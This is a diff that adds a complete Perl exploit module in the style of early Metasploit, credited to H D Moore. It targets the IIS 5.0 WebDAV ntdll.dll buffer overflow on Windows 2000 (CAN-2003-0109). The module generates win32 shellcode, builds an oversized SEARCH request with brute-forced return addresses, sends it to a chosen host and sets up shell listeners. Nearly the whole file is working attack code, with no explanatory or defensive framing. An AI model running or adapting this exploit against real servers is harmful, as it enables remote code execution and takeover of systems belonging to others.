@@ -1,0 +1,218 @@
+use IO::Socket;
+use Pex;
+
+##
+#
+$Name = "IIS 5.0 WebDAV ntdll.dll Overflow";
+$Version = "1.1";
+$Author = "H D Moore";
+$URL = "http://www.metasploit.com";
+$Group = "IIS";
+$Description = "This exploits a buffer overflow in NTDLL.dll on Windows 2000 ".
+               "through the SEARCH WebDAV method in IIS. This particular module ".
+               "only works against Windows 2000. It should have a reasonable chance ".
+               "of success against any service pack.".
+               "Please see the following URL for more information on this vulnerability.\n\n".
+               "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2003-0109";                  
+#
+##
+
+my $pex = Pex->new();
+my $pay = {};
+
+sub Init {
+    my ($obj) = @_;
+    $obj->NeedPayload(1);
+    $obj->Payloads();
+}
+
+sub Payloads {
+    my ($obj, $opt) = @_;
+    my $x = $pex->Payloads();
+    
+    # win32 exploit, load the payloads
+    my $wincode = $x->{"x86"}->{"win32"};
+    foreach my $s (keys(%{ $wincode }))
+    {
+        my $name = $wincode->{$s}->{"NAME"};
+        $pay->{$name} = $wincode->{$s};
+    }
+     
+    return $pay;
+}
+
+sub Check {
+    my ($obj, $opt) = @_;   
+    return "No vulnerability check has been implemented for this module.";
+}
+
+sub Options {
+    my ($obj, $payload) = @_;
+    my $res = {};
+      
+    $res->{"RHOST"} = [1, "The target system's ip address."];
+    $res->{"RPORT"} = [1, "The port that IIS is running on."];    
+    $res->{"RET"}   = [0, "The return address (ex: 0xCD01)"];
+    
+    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
+    {
+        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
+    }
+    return $res;
+}
+
+sub SetupPayload {
+    my ($opt) = @_;
+
+    my $payload = $pay->{$opt->{"PAYLOAD"}};
+    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
+    if (! $pname)
+    {
+        print "[*] No such payload exists.\n";
+        return(undef);
+    }
+    
+    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
+
+    
+    my $shellcode = $pex->EasySC("\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c", 512, $parch, $pos, $pname, $opt);
+
+    if ($shellcode)
+    {
+        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
+    } else {
+        print "[*] Error generating payload: " . $pex->Error() . "\n";
+        return(undef);
+    }
+
+
+    my $listener;
+    my $handler = $payload->{"SHELL"};
+      
+    if ($handler)
+    { 
+        $listener = $pex->$handler($opt);
+        if ($listener == 0) { return undef }
+        return ($shellcode, $listener);
+    }
+    
+    # other payloads fork to maintain compatibility
+    $listener = $$;
+    my $exploit = fork();
+    if (! $exploit) { return ($shellcode, $listener) }
+    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
+    return(undef);
+
+}
+
+sub Exploit {
+    my ($obj, $opt) = @_;
+
+    select(STDOUT);$|++;
+
+    my $target_host = $opt->{"RHOST"};
+    my $target_port = $opt->{"RPORT"} || 80;
+    my $target_ret  = $opt->{"RET"};
+    
+    my ($shellcode, $listener) = SetupPayload($opt);
+    if (! defined($shellcode)) { return; }
+    print "\n";
+    
+    my @targets =
+    (
+        # Almost Targetted :)
+        "\x4f\x4e", # =SP3
+        "\x41\x42", # ~SP0  ~SP2
+        "\x41\x43", # ~SP1, ~SP2
+        
+        # Generic Brute Force
+        "\x41\xc1", 
+        "\x41\xc3",
+        "\x41\xc9",
+        "\x41\xca",
+        "\x41\xcb",
+        "\x41\xcc",
+        "\x41\xcd",
+        "\x41\xce",
+        "\x41\xcf",                 
+        "\x41\xd0",         
+    );
+   
+    # allow user specified return address
+    if ($target_ret)
+    {
+        my $ret = pack("S", eval($opt->{"RET"}));
+        
+        if ($ret eq "\x00\x00")
+        {
+            print "[*] Invalid return address, use 0xXXYY\n";
+            exit(0);
+        }
+        @targets = ($ret);
+    }
+
+    foreach my $ret (@targets)
+    {
+        
+        my $url = ("A" x 65516);
+        
+        my $s = PollWebServer($target_host, $target_port);
+
+        printf ("[*] Trying return address 0x%.8x\n", 
+                unpack("L", substr($ret,0,1) . "\x00".
+                            substr($ret,1,1) . "\x00"
+                      )
+               );
+        
+        substr($url, length($url) - length($shellcode), length($shellcode), $shellcode);
+        substr($url, 283, 2, $ret );
+
+        my ($request, $content);
+        
+        $request  = "SEARCH /" . $url ." HTTP/1.1\r\n";
+        $request .= "Host: " . $target_host . ":" . $target_port . "\r\n";
+        $request .= "Content-Type: text/xml\r\n";
+
+        $content .= "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n";
+        $content .= "<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";
+
+        $request .= "Content-Length: " . length($content) . "\r\n";
+        $request .= "\r\n$content";
+
+        print "[*] Sending request (" . length($request) . " bytes)\n\n";
+        print $s $request;
+        my $r = <$s>;
+        sleep(2);
+
+    }
+    exit(0);
+}
+
+
+sub PollWebServer {
+    my ($target_host, $target_port) = @_;
+    
+    select(STDOUT); $|++;
+    print "[*] Connecting to web server";
+    for (1 .. 20)
+    {
+        print ".";
+        my $s = IO::Socket::INET->new
+        (
+            PeerAddr    => $target_host,
+            PeerPort    => $target_port,
+            Protocol    => "tcp",
+            Type        => SOCK_STREAM,
+        );
+        
+        if ($s) 
+        {
+            print " OK\n";
+            return($s) 
+        }
+        
+        sleep(2);
+    }
+    print "\n[*] Giving up on the web server.\n";
+    exit(0);
+}
